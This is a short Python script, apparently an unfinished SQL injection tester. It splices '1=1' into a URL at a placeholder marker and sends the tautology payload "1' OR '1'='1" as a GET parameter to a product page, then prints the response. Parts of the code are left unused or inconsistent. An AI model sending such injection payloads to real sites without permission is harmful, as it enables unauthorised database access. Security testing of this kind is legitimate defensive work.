import requests

def sqli(URL, output):
    print("test sqli")
    print("URL: "+URL)
    print("ot: "+str(output))

    payload = "1=1"
    injected_url = ""
    payload_index = URL.find("[*]")
    injected_url = URL[0:payload_index] + payload #+ URL[payload_index+3:len(URL)]
    print(injected_url)

    

    url = "http://example.com/product"
    payload = "1' OR '1'='1"
    params = {'id': payload}

    response = requests.get(url, params=params)

    print(f"[+] Sent payload to: {response.url}")
    print(f"[+] HTTP Status: {response.status_code}")
    print("[+] Response Preview:")
    print(response.text[:500])

